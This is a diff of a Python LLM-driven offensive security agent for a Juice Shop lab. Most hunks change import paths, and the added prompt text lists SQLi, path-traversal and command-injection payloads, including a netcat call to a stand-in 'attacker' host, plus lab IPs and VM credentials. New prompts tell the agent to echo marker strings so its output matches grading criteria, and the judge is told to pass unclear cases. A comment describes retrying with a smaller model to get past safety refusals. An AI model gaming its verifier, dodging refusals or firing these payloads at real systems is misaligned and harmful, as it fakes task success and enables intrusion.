@@ -24,10 +24,10 @@ from typing import Generator
 
 import httpx
 
-from packages.bastion.playbook import list_playbooks, load_playbook, run_playbook
-from packages.bastion.prompt import build_system_prompt, build_planning_prompt
-from packages.bastion.rag import build_index, format_context
-from packages.bastion.skills import SKILLS, SKILL_CATEGORIES, execute_skill, preview_skill, skills_to_ollama_tools
+from bastion.playbook import list_playbooks, load_playbook, run_playbook
+from bastion.prompt import build_system_prompt, build_planning_prompt
+from bastion.rag import build_index, format_context
+from bastion.skills import SKILLS, SKILL_CATEGORIES, execute_skill, preview_skill, skills_to_ollama_tools
 
 
 # ── 입력 정제 ──────────────────────────────────────────────────────────────
@@ -606,7 +606,7 @@ class BastionAgent:
                  knowledge_dir: str = "", evidence_db: str = "",
                  approval_mode: str = "normal"):
         self.vm_ips = vm_ips
-        from packages.bastion import LLM_BASE_URL, LLM_MANAGER_MODEL
+        from bastion import LLM_BASE_URL, LLM_MANAGER_MODEL
         self.ollama_url = (ollama_url or LLM_BASE_URL).rstrip("/")
         self.model = model or LLM_MANAGER_MODEL
         self.history: list[dict] = []
@@ -617,12 +617,12 @@ class BastionAgent:
         self.approval_mode = approval_mode
 
         # Experience Learning Layer — 카테고리 수준 일반화 경험 학습
-        from packages.bastion.experience import ExperienceLearner
+        from bastion.experience import ExperienceLearner
         self.experience = ExperienceLearner(db_path=self.evidence_db.db_path)
 
         # History Layer (L4) — 시계열·내러티브·anchor·changelog. KG 와 동일 SQLite 공유.
         try:
-            from packages.bastion.history import HistoryLayer
+            from bastion.history import HistoryLayer
             self.history_layer = HistoryLayer()
         except Exception:
             self.history_layer = None
@@ -771,7 +771,7 @@ class BastionAgent:
         finally:
             # ── Audit 기록 (항상, 에러나도) ───────────────────────────────────
             try:
-                from packages.bastion.audit import get_audit_log
+                from bastion.audit import get_audit_log
                 duration_ms = int((_time.time() - t0) * 1000)
                 test_meta = getattr(self, "_test_meta", {}) or {}
                 verify_ctx = getattr(self, "_verify_context", {}) or {}
@@ -1110,7 +1110,7 @@ class BastionAgent:
                 self._update_assets_from_result(skill_name, params, success)
                 # 5a) Asset autoscan — probe 결과 → asset 노드 자동 등록
                 try:
-                    from packages.bastion.asset_domain import autoscan_register
+                    from bastion.asset_domain import autoscan_register
                     import re as _re
                     target = params.get("target", "")
                     out = output or ""
@@ -1479,7 +1479,7 @@ class BastionAgent:
         - 모델 호출 실패 시 조용히 빈 리스트 (무해)
         """
         try:
-            from packages.bastion import LLM_SUBAGENT_MODEL
+            from bastion import LLM_SUBAGENT_MODEL
             sub_model = LLM_SUBAGENT_MODEL
         except Exception:
             sub_model = "gemma3:4b"
@@ -1638,6 +1638,8 @@ class BastionAgent:
             "\n"
             "## ★★ Web-vuln-ai 카테고리 — OWASP payload library (R3 32.5% → 50%+ 목표)\n"
             "  ★ probe_all/probe_host 호출 절대 금지. shell 로 raw curl/python payload 작성.\n"
+            "  ★ Target IP: web 의 외부 NIC = `192.168.0.100` (Juice Shop 운영 중). 내부 10.20.30.80 은 bastion-internal 표기 — attacker 측 sqlmap/curl 등은 192.168.0.100 사용.\n"
+            "  ★ Attacker VM = 192.168.0.112 (ccc/1, sqlmap·ffuf·nuclei·whatweb·hydra·gobuster·sslscan 설치).\n"
             "  · A01 BAC/IDOR        → curl -b 'cookie' http://target/api/users/2 (다른 user ID 시도)\n"
             "  · A03 SQLi (Boolean)  → curl 'http://target/?id=1%27%20OR%20%271%27=%271' (' OR '1'='1)\n"
             "  · A03 SQLi (Time)     → curl 'http://target/?id=1%27%20AND%20SLEEP(5)--' (5초 지연 측정)\n"
@@ -1660,6 +1662,13 @@ class BastionAgent:
             "  · Path Traversal      → ../../../etc/passwd / %2e%2e%2f URL-encoded\n"
             "  · Cmd Injection       → ; cat /etc/passwd / | nc attacker 4444 / `cat /etc/shadow`\n"
             "  · 도구 미설치 시      → raw curl/python/ruby 으로 동등 효과 (sqlmap 없어도 manual SQLi 가능)\n"
+            "\n"
+            "## ★ 응답 분석·검증 명령 패턴 (R3 fix 2026-04-30)\n"
+            "  ★ curl -s 단독 X — 본문만 보여 헤더·상태코드 누락. `curl -i` (헤더+본문) 또는 `curl -sIL` (헤더 전체) 사용.\n"
+            "  ★ 정상 vs 주입 응답 비교 시 단순 cat 합치기 금지 — `diff <(curl -s URL1) <(curl -s URL2)` 또는 응답 길이/상태코드 명시 출력.\n"
+            "    예: a=$(curl -s 'URL?q=test' | wc -c); b=$(curl -s 'URL?q=PAYLOAD' | wc -c); echo normal=$a injected=$b\n"
+            "  ★ 에러 페이지·정보 누출 검사 시 `curl -i URL/nonexistent | head -30` — 본문 상위 30줄까지 stack trace 검증.\n"
+            "  ★ shell tool 실행 시 stdout 이 verify 의 success_criteria 와 매칭되도록 `echo`/`grep` 으로 명시적 marker 출력. 예: `&& echo '에러 페이지 분석 완료'` 추가.\n"
             "\n"
             "## 도구 호출 예시 (★ 첫 turn 패턴)\n"
             "예시1) user: '메모리 덤프 떠서 IoC 추출해'\n"
@@ -1711,7 +1720,7 @@ class BastionAgent:
         # KG-4: playbook lookup → reuse/adapt/new 결정
         lookup_result = None
         try:
-            from packages.bastion.lookup import decide, build_lookup_prompt
+            from bastion.lookup import decide, build_lookup_prompt
             lookup_result = decide(message, self.ollama_url, self.model)
             yield {"event": "lookup_decision",
                    "decision": lookup_result.get("decision"),
@@ -1905,11 +1914,21 @@ class BastionAgent:
                     if not ok:
                         self_verified_attempted += 1
                         yield {"event": "self_verify_fail", "reason": why}
+                        # ★ R3 fix #3 (2026-04-30): 미충족 success_criteria 를 명시해 LLM 이
+                        #   어느 기준을 추가 충족해야 하는지 알게 함. 이전엔 막연한 '추가로 호출' 만
+                        #   요청해 같은 명령을 반복하다 6 turn 소진.
+                        _ctx_v = getattr(self, "_verify_context", {}) or {}
+                        _crits = _ctx_v.get("success_criteria") or []
+                        _crit_text = "\n".join(f"- {c}" for c in _crits[:5]) if _crits else "(없음)"
                         msgs.append({"role": "user", "content": (
-                            f"[자체 검증 — 미흡] {why}\n"
-                            f"채점 기준이 아직 충족되지 않았다. "
-                            f"필요한 도구를 추가로 호출해 작업을 완성하라. "
-                            f"개념 설명·표만 출력하지 말고 실제 명령을 실행하라."
+                            f"[자체 검증 — 미흡] {why}\n\n"
+                            f"## 아직 충족 못한 채점 기준\n{_crit_text}\n\n"
+                            f"## 다음 turn 행동 지침\n"
+                            f"1. 위 기준 중 하나라도 충족하는 명령을 실행한다. 같은 명령 재실행 금지.\n"
+                            f"2. 응답 검증 명령은 본문이 빈 페이지일 수 있으므로 `curl -i -L` 사용.\n"
+                            f"3. 명령만 출력하지 말고 도구 호출 (tool_calls) 로 실제 실행한다.\n"
+                            f"4. 실행 결과 stdout 을 인용해 어느 기준을 충족했는지 명시한다.\n"
+                            f"5. 개념 설명/표/이론은 작성 금지. 실측 결과 + 한 줄 결론만."
                         )})
                         continue
                 break  # end_turn
@@ -2103,16 +2122,36 @@ class BastionAgent:
         yield {"event": "stage", "stage": "validating"}
 
         # 마지막 LLM content 가 비었으면 종합 답변 1회 생성
+        # ★ R3 fix #3 (2026-04-30): 막연한 "한 단락 작성" 대신 채점 기준·도구 출력 인용 강제.
         if not last_assistant_content.strip() and all_tool_outputs:
+            _ctx_s = getattr(self, "_verify_context", {}) or {}
+            _crits_s = _ctx_s.get("success_criteria") or []
+            _intent_s = _ctx_s.get("intent", "")
+            _crit_block = ""
+            if _crits_s or _intent_s:
+                _crit_lines = "\n".join(f"- {c}" for c in _crits_s[:5])
+                _crit_block = (
+                    f"\n## 채점 기준 (이걸로 평가됨)\n"
+                    f"의도: {_intent_s}\n"
+                    f"성공 기준:\n{_crit_lines}\n"
+                )
+            _synth_prompt = (
+                "위 도구 실행 결과를 바탕으로 사용자 요청에 대한 최종 답을 작성하라.\n"
+                "## 작성 규칙 (필수)\n"
+                "1. 도구 stdout 에서 인용 가능한 핵심 라인 1~2줄을 그대로 인용.\n"
+                "2. 채점 기준이 있다면 각 기준에 대해 충족/미충족 한 줄씩 표시.\n"
+                "3. 개념 설명·이론·일반론 금지. 실측 결과 기반 결론만.\n"
+                "4. 분량: 5~10줄."
+                + _crit_block
+            )
             try:
                 r = httpx.post(
                     f"{self.ollama_url}/api/chat",
                     json={
                         "model": self.model,
-                        "messages": msgs + [{"role": "user", "content":
-                            "위 결과를 종합해서 사용자 요청에 대한 최종 답을 한 단락으로 작성하라."}],
+                        "messages": msgs + [{"role": "user", "content": _synth_prompt}],
                         "stream": False,
-                        "options": {"temperature": 0.0, "num_predict": 600},
+                        "options": {"temperature": 0.0, "num_predict": 800},
                     },
                     timeout=60.0,
                 )
@@ -2169,11 +2208,11 @@ class BastionAgent:
             return  # tool 안 쓴 Q&A 는 그래프 학습에서 제외
 
         try:
-            from packages.bastion.graph import get_graph
-            from packages.bastion.playbook import (
+            from bastion.graph import get_graph
+            from bastion.playbook import (
                 write_playbook, update_exec_history, _slugify,
             )
-            from packages.bastion.experience import CATEGORY_RULES
+            from bastion.experience import CATEGORY_RULES
         except Exception:
             return
 
@@ -2353,10 +2392,20 @@ class BastionAgent:
             return ok, "" if ok else "도구 실행 성공 사례 없음"
 
         # tool_outputs 를 한 줄씩 요약
+        # ★ R3 fix #3 (2026-04-30): output truncation 200→800자. 200자는 curl 헤더 1개도
+        #   다 안 들어가 self-verify LLM 이 충족 여부 판정 불가 → 무조건 fail 권고하던 버그.
         tool_summary = "\n".join(
-            f"- {t['skill']} (success={t['success']}): {str(t['output'])[:200]}"
+            f"- {t['skill']} (success={t['success']}): {str(t['output'])[:800]}"
             for t in tool_outputs[-5:]
         ) or "(도구 호출 없음)"
+
+        neg = ctx.get("negative_signs") or []
+        neg_block = ""
+        if neg:
+            neg_block = (
+                "\n## 피해야 할 신호 (negative_signs — 응답에 명시되면 fail)\n"
+                + "\n".join(f"- {n}" for n in neg) + "\n"
+            )
 
         prompt = (
             "ReAct agent 의 작업 완료 여부를 채점 기준에 따라 평가하라.\n"
@@ -2365,12 +2414,16 @@ class BastionAgent:
             f"## 사용자 요청\n{original_message[:600]}\n\n"
             f"## 채점 의도\n{intent}\n\n"
             f"## 성공 기준 (하나 이상 충족 필요)\n"
-            + "\n".join(f"- {c}" for c in criteria) + "\n\n"
-            f"## 도구 실행 요약\n{tool_summary}\n\n"
+            + "\n".join(f"- {c}" for c in criteria) + "\n"
+            + neg_block
+            + f"\n## 도구 실행 요약 (success/output 800자)\n{tool_summary}\n\n"
             f"## 최종 답변\n{final_content[:1500]}\n\n"
-            "기준 충족 여부 평가 — 도구 출력에 기준이 충족됐거나, "
-            "도구 결과가 의도와 일치하면 satisfied=true. "
-            "도구가 한 번도 안 돌았거나 답변이 개념 설명뿐이면 satisfied=false."
+            "## 판정 원칙\n"
+            "- 도구 출력에 성공 기준 중 하나가 충족됐으면 satisfied=true.\n"
+            "- 도구 결과가 의도와 일치(등가 표현 인정)하면 satisfied=true.\n"
+            "- 도구가 한 번도 안 돌았거나 답변이 개념 설명뿐이면 satisfied=false.\n"
+            "- negative_signs 가 응답에 명시적으로 나타나면 satisfied=false.\n"
+            "- 모호하면 satisfied=true (도구가 1회라도 success).\n"
         )
         try:
             r = httpx.post(
@@ -2542,7 +2595,7 @@ class BastionAgent:
         # w24 개선: Manager 모델 실패 시 SubAgent(작은 모델) 재시도
         # — 작은 모델이 더 직설적인 1줄 명령을 낼 때가 있음 (과도한 안전 필터 적응 유발)
         try:
-            from packages.bastion import LLM_SUBAGENT_MODEL
+            from bastion import LLM_SUBAGENT_MODEL
             sub_model = LLM_SUBAGENT_MODEL
         except Exception:
             sub_model = "gemma3:4b"
@@ -2902,7 +2955,7 @@ class BastionAgent:
 
     def _enrich_params(self, skill_name: str, params: dict) -> dict:
         """role 이름 → IP 자동 변환, skill 고정 target_vm 자동 주입."""
-        from packages.bastion import INTERNAL_IPS
+        from bastion import INTERNAL_IPS
         enriched = dict(params)
         skill_def = SKILLS.get(skill_name, {})
 
@@ -2930,7 +2983,7 @@ class BastionAgent:
 
     def _pre_check(self, skill_name: str, params: dict) -> tuple[bool, str]:
         """실행 전 타겟 VM 헬스 확인 (evidence-first)."""
-        from packages.bastion import health_check, INTERNAL_IPS
+        from bastion import health_check, INTERNAL_IPS
         skill_def = SKILLS.get(skill_name, {})
         target_vm = skill_def.get("target_vm", "auto")
 
@@ -3130,7 +3183,7 @@ class BastionAgent:
         for role, r_ip in self.vm_ips.items():
             if r_ip == ip:
                 return role
-        from packages.bastion import INTERNAL_IPS
+        from bastion import INTERNAL_IPS
         for role, r_ip in INTERNAL_IPS.items():
             if r_ip == ip:
                 return role
@@ -3201,7 +3254,7 @@ class BastionAgent:
 
         반환: skills_to_ollama_tools() 와 동일 형식 (subset).
         """
-        from packages.bastion.skills import SKILLS, skills_to_ollama_tools
+        from bastion.skills import SKILLS, skills_to_ollama_tools
         msg_low = (message or "").lower()
         scored: dict[str, int] = {}
         for sname in SKILLS:
@@ -3262,7 +3315,7 @@ class BastionAgent:
 
     def _update_assets_from_result(self, skill_name: str, params: dict, success: bool):
         """Skill 실행 결과로 Asset 상태 업데이트."""
-        from packages.bastion import INTERNAL_IPS
+        from bastion import INTERNAL_IPS
         status = "online" if success else "unreachable"
         if skill_name == "probe_all":
             for role, ip in self.vm_ips.items():
